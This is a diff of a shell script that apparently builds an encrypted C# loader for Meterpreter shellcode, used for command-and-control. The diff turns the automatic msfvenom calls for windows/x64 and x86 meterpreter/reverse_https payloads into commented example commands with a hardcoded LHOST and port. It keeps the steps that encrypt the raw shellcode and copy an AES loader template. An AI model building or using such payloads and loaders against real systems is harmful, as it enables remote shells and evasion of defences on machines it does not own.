@@ -14,20 +14,18 @@ echo 'c2type:'$c2type
 
 mkdir tmp
 mkdir output
-mkdir input
 
-rawscfilename=$lhost'_'$lport'_https.bin'
+### To Generate a Meterpreter implant shellcode without obfuscation:
+# for x64
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/$rawscfilename
+# for x86
+# msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/$rawscfilename
+### Move the meterpreter.bin to folder input if required, then run the autogen script.
+
+rawscfilename='meterpreter.bin'
 rawscfilename_enc=$rawscfilename'.enc'
 
-if [ $arch = 'x64' ]
-then
-    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o input/$rawscfilename
-fi
-
-if [ $arch = 'x86' ]
-then
-    msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o input/$rawscfilename
-fi
+sleep 2
 
 cp aesloader2_template.txt tmp/aesloadermono_mp.cs
 
